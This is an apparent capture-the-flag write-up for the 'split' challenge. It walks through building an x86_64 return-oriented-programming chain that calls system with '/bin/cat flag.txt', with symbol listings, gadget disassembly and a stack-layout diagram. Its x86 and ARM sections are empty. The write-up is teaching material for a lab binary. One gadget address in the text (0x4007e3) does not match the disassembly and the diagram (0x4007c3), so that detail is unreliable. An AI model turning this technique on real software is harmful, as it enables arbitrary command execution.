# split

Now the fun starts, i'll focus on what are the pieces i use to build ROP chains and
what is the purpose of each of those. For this challenge, like the last one, listing
symbols tells us a lot.
```bash
$ nm split
...
0000000000601060 t usefulString  # x86_64
...
0804a030 t usefulString          # x86
...
0002103c t usefulString          # ARMv5
...
```
By checking with a debugger, we can check the content of it, which is `/bin/cat flag.txt`   

On each binary, the usefulFunction is calling system, using with `/bin/ls` as argument.
The goal is to replace this argument with our usefulString.

## x86_64:
```asm
000000000040074b <ret2win + 0x09>:
  40074b:	e8 10 fe ff ff   call   400560 <system@plt>

00000000004007c2 <__libc_csu_init + 0x62>:
  4007c2:	41 5f            pop    r15
  4007c4:	c3               ret    
```
The 0x5f opcode is the one for `pop rdi`, the 0x41 byte is used to extend it
to the second set of registers thus displaying a `pop r15`. We can use 0x4007e3 as a
`pop rdi` gadget.   
With all of this, we can craft our exploit.   
```
┌─────────────────────────┐  ┌─────────────────────────┐
│ buffer                  │  │ 20 20 20 20 20 20 20 20 │
│                         │  │ 20 20 20 20 20 20 20 20 │
│                         │  │ 20 20 20 20 20 20 20 20 │
├─────────────────────────┤  │ 20 20 20 20 20 20 20 20 │
│ old_rbp                 │  │ 20 20 20 20 20 20 20 20 │
├─────────────────────────┤  ├─────────────────────────┤
│ ret                     │  │ 0x4007c3                │ <- pop rdi; ret
├─────────────────────────┤  ├─────────────────────────┤
│ ...                     │  │ 0x601060                │ <- usefulString address
│                         │  ├─────────────────────────┤
│                         │  │ 0x40074b                │ <- sytem call
└─────────────────────────┘  └─────────────────────────┘
```
## x86:

## ARM:
